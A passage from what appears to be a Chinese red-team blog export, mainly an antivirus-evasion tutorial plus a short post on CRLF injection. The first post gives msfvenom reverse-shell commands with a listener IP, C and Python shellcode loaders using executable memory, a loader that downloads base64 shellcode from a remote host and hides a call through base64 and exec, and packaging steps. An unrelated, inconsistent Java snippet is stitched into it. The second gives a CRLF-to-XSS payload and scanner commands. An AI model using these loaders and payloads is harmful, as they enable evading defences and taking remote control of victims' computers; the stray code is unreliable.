<p>这里以Python做免杀为例，其他语言如C#、GO、Ruby等免杀思路相同。</p>
<p>免杀的大致步骤可以分为如下，视情况可以采用部分步骤：</p>
<ul>
<li>加载器选择-ctypes-DLL&amp;其他，加载shellcode的组件</li>
<li>加密器选择-base64&amp;hex&amp;xor&amp;aes，加密shellcode的组件、异或</li>
<li>执行器选择-github上不是一大堆，用于执行shellcode的组件</li>
<li>打包器选择-pyinstaller&amp;py2exe，把代码打包成可执行文件的组件</li>
</ul>
<p>免杀思路一：msf生成C语言shellcode，编写C程序调用shellcode生成exe可执行文件</p>
<p>其实这部分无作任何免杀，只是换了调用方式，但还是能过电脑管家的（无语）</p>
<p>msf操作步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#生成C语言shellcode，此处生成的shellcode是程序执行在内存中的状态</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=yourip lport=6688 -f c</span><br><span class="line">#监听主机上线</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 6688</span><br></pre></td></tr></table></figure>

<p>C语言调用二进制生成exe代码（需要采用32位执行）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//此代码用于将msf生成的shellcode打包生成exe</span></span><br><span class="line"><span class="comment">//可能有同学要问了，为什么生成C语言的二进制码还需要利用C语言打包执行。其实exe程序运行时在内存中是二进制码，现在msf生成的是二进制码，需要打包成exe才能被执行</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">//windows控制台程序不出黑窗口</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) </span></span><br><span class="line"><span class="comment">//此处放msf生成的shellcode</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* Memory;</span><br><span class="line">    <span class="comment">// 申请EXECUTE属性内存</span></span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">// 拷贝shellcode</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// 执行shellcode</span></span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>免杀思路二：利用msf生成加密的C语言shellcode，再利用python去调用（免杀思路一是采用C语言调用）</p>
<p>python采用ctypes模块引用&amp;执行C语言代码</p>
<p>此处讲解个Python调用C语言生成的动态链接库的小案例：</p>
<p>vs生成dll文件小tips:（生成解决方案）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">TestCtypes</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I like eating you\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>python采用ctypes调用生成的dll文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#加载Dll1.dll</span></span><br><span class="line">lib=CDLL(<span class="string">&#x27;./Dll1.dll&#x27;</span>)</span><br><span class="line"><span class="comment">#调用当前库方法</span></span><br><span class="line">lib.TestCtypes()</span><br></pre></td></tr></table></figure>



<p>此处打包器选择pyinstaller</p>
<p>msf生成base64加密shellcode:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64 lhost=47.94.236.117 lport=6688 -f c</span><br></pre></td></tr></table></figure>

<p>python调用Ctypes模块解码调用shellcode（注：此处python必须为32位的）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#此处为msf生成的加密shellcode,去掉&quot;和;</span></span><br><span class="line">encode_shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = base64.b64decode(encode_shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行shellcode</span></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>pyinstaller.exe -F -w miansha-df.py #用于将py文件生成exe文件  （注：此处python必须为32位的）</p>
<p>免杀思路三：外部shellcode加载+特征语句定位加密（过hr、360）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#外部请求shellcode</span></span><br><span class="line">encode_shellcode = requests.get(<span class="string">&quot;http://yourip/123.txt&quot;</span>).text</span><br><span class="line"><span class="comment">#解密shellcode</span></span><br><span class="line">shellcode = base64.b64decode(encode_shellcode)</span><br><span class="line"></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#此处为ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))原语句base64加密</span></span><br><span class="line">func=base64.b64decode(<span class="string">b&#x27;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSk=&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(func)</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>



<p>注意点：</p>
<p>1.python执行C语言shellcode时需要使用python3 32位，打包成exe文件也需要使用32位的，win10上打包生成的exe在win7环境下会报错，要选择相应版本打包。</p>
<p>2.msf生成shellcode时，有无base64加密生成的shellcode形式相似，类似”x2f\x4f\x69\x50\x41”</p>
<p>​	2.1.本文中默认生成的shellcode是C语言shellcode码，是把byte码用十六进制来表示</p>
<p>​	2.2.添加base64加密生成的是base64加密的shellcode，同样是把byte码用十六进制来表示。在调用时需要把十六进制转化为字符串，为了方便起见，免杀思路三中的放在服务器上的123.txt在十六进制转换的字符串，便于操作，否则需要本地再次转换。</p>
<p>附带科普下，内存运行编码的各种概念。</p>
<p>内存大小是使用byte为单位的，msf生成的byte码是执行在内存时的编码，为16进制，而python在打印时会自动将十六进制编码转换为字符串，下面的python代码打印的结果为AVlNXa。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = <span class="string">&quot;\x41\x56\x6c\x4e\x58\x61&quot;</span></span><br><span class="line"><span class="built_in">print</span>(test)</span><br></pre></td></tr></table></figure>

<p>0X1 &#x3D; 1byte<br>0X10 &#x3D; 16 byte<br>0X100 &#x3D; 16<em>16 byte &#x3D; 256 byte<br>0X1000 &#x3D; 16 <em>256 byte&#x3D; 4 * ( 4 * 256byte) &#x3D; 4 * 1024 byte &#x3D;4K byte<br>0X1 0000 &#x3D; 16 * 4K byte &#x3D; 64K byte<br>0X10 0000 &#x3D; 16 * 64K byte &#x3D; 1024K byte &#x3D; 1M byte<br>0X100 0000 &#x3D; 16 * 1M byte &#x3D; 16M byte<br>0X1000 0000 &#x3D; 16 * 16M byte &#x3D; 256M byte<br>0X1 0000 0000 &#x3D; 16 * 256Mbyte &#x3D; 4</em>(4</em>256) Mbyte &#x3D; 4*1024Mbyte&#x3D;4Gbyte</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Pop <span class="title function_">evPop</span><span class="params">(Pop pop, RuleBean rule)</span> &#123;</span><br><span class="line">	<span class="type">Pop</span> <span class="variable">new1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pop</span>(pop.getLength());</span><br><span class="line">	<span class="type">int</span> elitismO;</span><br><span class="line">	<span class="keyword">if</span> (elitism) &#123;</span><br><span class="line">			elitismO = <span class="number">1</span>;</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">fit</span> <span class="operator">=</span> pop.getFitness();</span><br><span class="line">			fit.setId(<span class="number">0</span>);</span><br><span class="line">			new1.setPaper(<span class="number">0</span>, fitness);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> elitismO; i &lt; new1.getLength(); i++) &#123;</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">parent1</span> <span class="operator">=</span> select(pop);</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">parent2</span> <span class="operator">=</span> select(pop);</span><br><span class="line">			<span class="keyword">while</span> (parent2.getId() == parent1.getId()) &#123;</span><br><span class="line">				parent2 = select(pop);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">child</span> <span class="operator">=</span> crossover(parent1, parent2, rule);</span><br><span class="line">			child.setId(i);</span><br><span class="line">			newPopulation.setPaper(i, child);</span><br><span class="line">		&#125;</span><br><span class="line">    	Paper tmpPaper;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> elitismOffset; i &lt; newPopulation.getLength(); i++) &#123;</span><br><span class="line">			tmpPaper = new1.getPaper(i);</span><br><span class="line">			mutate(tmpPaper);</span><br><span class="line">			tmpPaper.setKpCoverage(rule);</span><br><span class="line">			tmpPaper.setAdaptationDegree(rule, Global.KP_WEIGHT, Global.DIFFCULTY_WEIGHt);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> new1;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>CRLF注入漏洞</title>
    <url>/2022/09/03/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><strong>0x01 CRLF注入漏洞</strong></p>
<p>回车换行（CRLF）注入攻击是一种当用户将CRLF字符插入到应用中而触发漏洞的攻击技巧。CRLF字符（%0d%0a）在许多互联网协议中表示行的结束，包括HTML，该字符解码后即为\ r\ n。这些字符可以被用来表示换行符，并且当该字符与HTTP协议请求和响应的头部一起联用时就有可能会出现各种各样的漏洞，包括http请求走私（HTTP RequestSmuggling）和http响应拆分（HTTP Response Splitting）。</p>
<p>一般有两种应用场景：</p>
<p>1、注入请求头导致html解析</p>
<p>2、注入操作日志导致后台日志记录混淆，比如恶意换行</p>
<p><strong>0x02 CRLF注入检测原理</strong></p>
<p>简单来讲就是在构造请求时，加上%0d%0a字符，验证后续代码能否被单独解析执行，如下测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET url=https://www.test.com%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;/</span><br><span class="line">Host:xxx</span><br></pre></td></tr></table></figure>

<p>如果存在CRLF注入漏洞会被解析为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET url=https://www.test.com</span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;/</span><br><span class="line">Host:xxx</span><br></pre></td></tr></table></figure>

<p>从而造成XSS</p>
<p><strong>0x03 CRLF注入自动化检测</strong></p>
<p>自动化检测工具地址：<a href="https://github.com/Nefcore/CRLFsuite">https://github.com/Nefcore/CRLFsuite</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/Nefcore/CRLFsuite.git</span><br><span class="line">$ cd CRLFsuite</span><br><span class="line">$ sudo python3 setup.py install</span><br><span class="line">$ crlfsuite -h</span><br></pre></td></tr></table></figure>

<p>用法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单网址扫描：</span><br><span class="line">$ crlfsuite -u &quot;http://testphp.vulnweb.com&quot;</span><br><span class="line"></span><br><span class="line">多个 URL 扫描：：</span><br><span class="line">$ crlfsuite -i targets.txt</span><br><span class="line"></span><br><span class="line">从标准输入：</span><br><span class="line">$ subfinder -d google.com -silent | httpx -silent | crlfsuite -s</span><br><span class="line"></span><br><span class="line">指定 cookie扫描：</span><br><span class="line">$ crlfsuite -u &quot;http://testphp.vulnweb.com&quot; --cookies &quot;key=val; newkey=newval&quot;</span><br><span class="line"></span><br><span class="line">使用 POST 方法：	</span><br><span class="line">$ crlfsuite -i targets.txt -m POST -d &quot;key=val&amp;newkey=newval&quot;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>常用渗透点</tag>
      </tags>
  </entry>
</search>
